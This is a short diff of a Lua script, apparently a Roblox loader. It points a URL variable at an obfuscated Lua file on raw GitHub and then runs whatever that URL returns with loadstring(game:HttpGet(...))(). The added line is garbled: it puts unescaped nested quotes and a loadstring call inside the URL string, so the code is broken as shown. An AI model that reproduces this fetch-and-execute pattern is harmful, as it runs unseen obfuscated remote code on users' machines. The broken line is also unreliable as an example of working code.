@@ -1,5 +1,5 @@
 
-Local ScriptURL = "https://raw.githubusercontent.com/xiuynghao-tech/RYEEXNZ-/f8d65154079067a7d0d19274afa2a8a45bbb55d6/obfuscated.lua.txt"
+Local ScriptURL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/xiuynghao-tech/RYEEXNZ-/f8d65154079067a7d0d19274afa2a8a45bbb55d6/obfuscated.lua.txt"))()"
 
 local success, err = pcall(function()
     loadstring(game:HttpGet(ScriptURL))()
